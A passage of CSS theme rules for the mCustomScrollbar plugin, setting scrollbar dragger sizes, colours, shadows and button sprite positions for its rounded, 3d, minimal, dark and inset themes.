        .mCS-rounded.mCSB_scrollTools_horizontal .mCSB_dragger {
            width: 14px
        }

        .mCS-rounded-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded-dots-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded-dots.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            height: 14px;
            margin: 1px 0
        }

        .mCS-rounded-dark.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded .mCSB_dragger_bar,
        .mCS-rounded-dark.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded .mCSB_dragger_bar,
        .mCS-rounded.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_dragger .mCSB_dragger_bar {
            width: 16px;
            height: 16px;
            margin: -1px 0
        }

        .mCS-rounded-dark.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCS-rounded-dark.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail,
        .mCS-rounded.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCS-rounded.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail {
            width: 4px
        }

        .mCS-rounded-dark.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded .mCSB_dragger_bar,
        .mCS-rounded-dark.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded .mCSB_dragger_bar,
        .mCS-rounded.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_dragger .mCSB_dragger_bar {
            height: 16px;
            width: 16px;
            margin: 0 -1px
        }

        .mCS-rounded-dark.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCS-rounded-dark.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail,
        .mCS-rounded.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCS-rounded.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail {
            height: 4px;
            margin: 6px 0
        }

        .mCS-rounded.mCSB_scrollTools .mCSB_buttonUp {
            background-position: 0 -72px
        }

        .mCS-rounded.mCSB_scrollTools .mCSB_buttonDown {
            background-position: 0 -92px
        }

        .mCS-rounded.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: 0 -112px
        }

        .mCS-rounded.mCSB_scrollTools .mCSB_buttonRight {
            background-position: 0 -128px
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .75)
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .15)
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar,
        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .85)
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-rounded-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar,
        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .9)
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -80px -72px
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -80px -92px
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -80px -112px
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -80px -128px
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools_vertical .mCSB_draggerRail,
        .mCS-rounded-dots.mCSB_scrollTools_vertical .mCSB_draggerRail {
            width: 4px
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-rounded-dots-dark.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-rounded-dots.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-rounded-dots.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            background-color: transparent;
            background-position: 50%
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-rounded-dots.mCSB_scrollTools .mCSB_draggerRail {
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAYAAADED76LAAAANElEQVQYV2NkIAAYiVbw//9/Y6DiM1ANJoyMjGdBbLgJQAX/kU0DKgDLkaQAvxW4HEvQFwCRcxIJK1XznAAAAABJRU5ErkJggg==");
            background-repeat: repeat-y;
            opacity: .3;
            filter: "alpha(opacity=30)";
            -ms-filter: "alpha(opacity=30)"
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-rounded-dots.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            height: 4px;
            margin: 6px 0;
            background-repeat: repeat-x
        }

        .mCS-rounded-dots.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -16px -72px
        }

        .mCS-rounded-dots.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -16px -92px
        }

        .mCS-rounded-dots.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -20px -112px
        }

        .mCS-rounded-dots.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -20px -128px
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_draggerRail {
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAYAAADED76LAAAALElEQVQYV2NkIAAYSVFgDFR8BqrBBEifBbGRTfiPZhpYjiQFBK3A6l6CvgAAE9kGCd1mvgEAAAAASUVORK5CYII=")
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -96px -72px
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -96px -92px
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -100px -112px
        }

        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -100px -128px
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-repeat: repeat-y;
            background-image: -webkit-gradient(linear, left top, right top, from(hsla(0, 0%, 100%, .5)), to(hsla(0, 0%, 100%, 0)));
            background-image: linear-gradient(90deg, hsla(0, 0%, 100%, .5) 0, hsla(0, 0%, 100%, 0))
        }

        .mCS-3d-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            background-repeat: repeat-x;
            background-image: -webkit-gradient(linear, left top, left bottom, from(hsla(0, 0%, 100%, .5)), to(hsla(0, 0%, 100%, 0)));
            background-image: linear-gradient(180deg, hsla(0, 0%, 100%, .5) 0, hsla(0, 0%, 100%, 0))
        }

        .mCS-3d-dark.mCSB_scrollTools_vertical .mCSB_dragger,
        .mCS-3d.mCSB_scrollTools_vertical .mCSB_dragger {
            height: 70px
        }

        .mCS-3d-dark.mCSB_scrollTools_horizontal .mCSB_dragger,
        .mCS-3d.mCSB_scrollTools_horizontal .mCSB_dragger {
            width: 70px
        }

        .mCS-3d-dark.mCSB_scrollTools,
        .mCS-3d.mCSB_scrollTools {
            opacity: 1;
            filter: "alpha(opacity=30)";
            -ms-filter: "alpha(opacity=30)"
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-3d.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools .mCSB_draggerRail {
            border-radius: 16px
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-3d.mCSB_scrollTools .mCSB_draggerRail {
            width: 8px;
            background-color: #000;
            background-color: rgba(0, 0, 0, .2);
            -webkit-box-shadow: inset 1px 0 1px rgba(0, 0, 0, .5), inset -1px 0 1px hsla(0, 0%, 100%, .2);
            box-shadow: inset 1px 0 1px rgba(0, 0, 0, .5), inset -1px 0 1px hsla(0, 0%, 100%, .2)
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-3d-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar,
        .mCS-3d-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #555
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            width: 8px
        }

        .mCS-3d-dark.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-3d.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            width: 100%;
            height: 8px;
            margin: 4px 0;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .5), inset 0 -1px 1px hsla(0, 0%, 100%, .2);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .5), inset 0 -1px 1px hsla(0, 0%, 100%, .2)
        }

        .mCS-3d-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            width: 100%;
            height: 8px;
            margin: 4px auto
        }

        .mCS-3d.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -32px -72px
        }

        .mCS-3d.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -32px -92px
        }

        .mCS-3d.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -40px -112px
        }

        .mCS-3d.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -40px -128px
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .1);
            -webkit-box-shadow: inset 1px 0 1px rgba(0, 0, 0, .1);
            box-shadow: inset 1px 0 1px rgba(0, 0, 0, .1)
        }

        .mCS-3d-dark.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1)
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -112px -72px
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -112px -92px
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -120px -112px
        }

        .mCS-3d-dark.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -120px -128px
        }

        .mCS-3d-thick-dark.mCSB_scrollTools,
        .mCS-3d-thick.mCSB_scrollTools {
            opacity: 1;
            filter: "alpha(opacity=30)";
            -ms-filter: "alpha(opacity=30)"
        }

        .mCS-3d-thick-dark.mCSB_scrollTools,
        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_draggerContainer,
        .mCS-3d-thick.mCSB_scrollTools,
        .mCS-3d-thick.mCSB_scrollTools .mCSB_draggerContainer {
            border-radius: 7px
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            border-radius: 5px
        }

        .mCSB_inside+.mCS-3d-thick-dark.mCSB_scrollTools_vertical,
        .mCSB_inside+.mCS-3d-thick.mCSB_scrollTools_vertical {
            right: 1px
        }

        .mCS-3d-thick-dark.mCSB_scrollTools_vertical,
        .mCS-3d-thick.mCSB_scrollTools_vertical {
            -webkit-box-shadow: inset 1px 0 1px rgba(0, 0, 0, .1), inset 0 0 14px rgba(0, 0, 0, .5);
            box-shadow: inset 1px 0 1px rgba(0, 0, 0, .1), inset 0 0 14px rgba(0, 0, 0, .5)
        }

        .mCS-3d-thick-dark.mCSB_scrollTools_horizontal,
        .mCS-3d-thick.mCSB_scrollTools_horizontal {
            bottom: 1px;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1), inset 0 0 14px rgba(0, 0, 0, .5);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1), inset 0 0 14px rgba(0, 0, 0, .5)
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            -webkit-box-shadow: inset 1px 0 0 hsla(0, 0%, 100%, .4);
            box-shadow: inset 1px 0 0 hsla(0, 0%, 100%, .4);
            width: 12px;
            margin: 2px;
            position: absolute;
            height: auto;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0
        }

        .mCS-3d-thick-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            -webkit-box-shadow: inset 0 1px 0 hsla(0, 0%, 100%, .4);
            box-shadow: inset 0 1px 0 hsla(0, 0%, 100%, .4)
        }

        .mCS-3d-thick.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #555
        }

        .mCS-3d-thick-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            height: 12px;
            width: auto
        }

        .mCS-3d-thick.mCSB_scrollTools .mCSB_draggerContainer {
            background-color: #000;
            background-color: rgba(0, 0, 0, .05);
            -webkit-box-shadow: inset 1px 1px 16px rgba(0, 0, 0, .1);
            box-shadow: inset 1px 1px 16px rgba(0, 0, 0, .1)
        }

        .mCS-3d-thick.mCSB_scrollTools .mCSB_draggerRail {
            background-color: transparent
        }

        .mCS-3d-thick.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -32px -72px
        }

        .mCS-3d-thick.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -32px -92px
        }

        .mCS-3d-thick.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -40px -112px
        }

        .mCS-3d-thick.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -40px -128px
        }

        .mCS-3d-thick-dark.mCSB_scrollTools {
            -webkit-box-shadow: inset 0 0 14px rgba(0, 0, 0, .2);
            box-shadow: inset 0 0 14px rgba(0, 0, 0, .2)
        }

        .mCS-3d-thick-dark.mCSB_scrollTools_horizontal {
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1), inset 0 0 14px rgba(0, 0, 0, .2);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1), inset 0 0 14px rgba(0, 0, 0, .2)
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            -webkit-box-shadow: inset 1px 0 0 hsla(0, 0%, 100%, .4), inset -1px 0 0 rgba(0, 0, 0, .2);
            box-shadow: inset 1px 0 0 hsla(0, 0%, 100%, .4), inset -1px 0 0 rgba(0, 0, 0, .2)
        }

        .mCS-3d-thick-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            -webkit-box-shadow: inset 0 1px 0 hsla(0, 0%, 100%, .4), inset 0 -1px 0 rgba(0, 0, 0, .2);
            box-shadow: inset 0 1px 0 hsla(0, 0%, 100%, .4), inset 0 -1px 0 rgba(0, 0, 0, .2)
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar,
        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #777
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_draggerContainer {
            background-color: #fff;
            background-color: rgba(0, 0, 0, .05);
            -webkit-box-shadow: inset 1px 1px 16px rgba(0, 0, 0, .1);
            box-shadow: inset 1px 1px 16px rgba(0, 0, 0, .1)
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_draggerRail {
            background-color: transparent
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -112px -72px
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -112px -92px
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -120px -112px
        }

        .mCS-3d-thick-dark.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -120px -128px
        }

        .mCSB_outside+.mCS-minimal-dark.mCSB_scrollTools_vertical,
        .mCSB_outside+.mCS-minimal.mCSB_scrollTools_vertical {
            right: 0;
            margin: 12px 0
        }

        .mCustomScrollBox.mCS-minimal+.mCSB_scrollTools+.mCSB_scrollTools.mCSB_scrollTools_horizontal,
        .mCustomScrollBox.mCS-minimal+.mCSB_scrollTools.mCSB_scrollTools_horizontal,
        .mCustomScrollBox.mCS-minimal-dark+.mCSB_scrollTools+.mCSB_scrollTools.mCSB_scrollTools_horizontal,
        .mCustomScrollBox.mCS-minimal-dark+.mCSB_scrollTools.mCSB_scrollTools_horizontal {
            bottom: 0;
            margin: 0 12px
        }

        .mCS-dir-rtl>.mCSB_outside+.mCS-minimal-dark.mCSB_scrollTools_vertical,
        .mCS-dir-rtl>.mCSB_outside+.mCS-minimal.mCSB_scrollTools_vertical {
            left: 0;
            right: auto
        }

        .mCS-minimal-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-minimal.mCSB_scrollTools .mCSB_draggerRail {
            background-color: transparent
        }

        .mCS-minimal-dark.mCSB_scrollTools_vertical .mCSB_dragger,
        .mCS-minimal.mCSB_scrollTools_vertical .mCSB_dragger {
            height: 50px
        }

        .mCS-minimal-dark.mCSB_scrollTools_horizontal .mCSB_dragger,
        .mCS-minimal.mCSB_scrollTools_horizontal .mCSB_dragger {
            width: 50px
        }

        .mCS-minimal.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .2);
            filter: "alpha(opacity=20)";
            -ms-filter: "alpha(opacity=20)"
        }

        .mCS-minimal.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-minimal.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .5);
            filter: "alpha(opacity=50)";
            -ms-filter: "alpha(opacity=50)"
        }

        .mCS-minimal-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .2);
            filter: "alpha(opacity=20)";
            -ms-filter: "alpha(opacity=20)"
        }

        .mCS-minimal-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-minimal-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .5);
            filter: "alpha(opacity=50)";
            -ms-filter: "alpha(opacity=50)"
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-light-3.mCSB_scrollTools .mCSB_draggerRail {
            width: 6px;
            background-color: #000;
            background-color: rgba(0, 0, 0, .2)
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-light-3.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            width: 6px
        }

        .mCS-dark-3.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-dark-3.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-light-3.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-light-3.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            width: 100%;
            height: 6px;
            margin: 5px 0
        }

        .mCS-dark-3.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCS-dark-3.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail,
        .mCS-light-3.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCS-light-3.mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail {
            width: 12px
        }

        .mCS-dark-3.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCS-dark-3.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail,
        .mCS-light-3.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCS-light-3.mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail {
            height: 12px;
            margin: 2px 0
        }

        .mCS-light-3.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -32px -72px
        }

        .mCS-light-3.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -32px -92px
        }

        .mCS-light-3.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -40px -112px
        }

        .mCS-light-3.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -40px -128px
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .75)
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .85)
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-dark-3.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .9)
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .1)
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -112px -72px
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -112px -92px
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -120px -112px
        }

        .mCS-dark-3.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -120px -128px
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-inset-2.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-inset-3.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-inset.mCSB_scrollTools .mCSB_draggerRail {
            width: 12px;
            background-color: #000;
            background-color: rgba(0, 0, 0, .2)
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-2.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-3.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            width: 6px;
            margin: 3px 5px;
            position: absolute;
            height: auto;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0
        }

        .mCS-inset-2-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-2.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-3-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-3.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-dark.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            height: 6px;
            margin: 5px 3px;
            position: absolute;
            width: auto;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0
        }

        .mCS-inset-2-dark.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-inset-2.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-inset-3-dark.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-inset-3.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-inset-dark.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-inset.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            width: 100%;
            height: 12px;
            margin: 2px 0
        }

        .mCS-inset-2.mCSB_scrollTools .mCSB_buttonUp,
        .mCS-inset-3.mCSB_scrollTools .mCSB_buttonUp,
        .mCS-inset.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -32px -72px
        }

        .mCS-inset-2.mCSB_scrollTools .mCSB_buttonDown,
        .mCS-inset-3.mCSB_scrollTools .mCSB_buttonDown,
        .mCS-inset.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -32px -92px
        }

        .mCS-inset-2.mCSB_scrollTools .mCSB_buttonLeft,
        .mCS-inset-3.mCSB_scrollTools .mCSB_buttonLeft,
        .mCS-inset.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -40px -112px
        }

        .mCS-inset-2.mCSB_scrollTools .mCSB_buttonRight,
        .mCS-inset-3.mCSB_scrollTools .mCSB_buttonRight,
        .mCS-inset.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -40px -128px
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-3-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-inset-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .75)
        }

        .mCS-inset-2-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar,
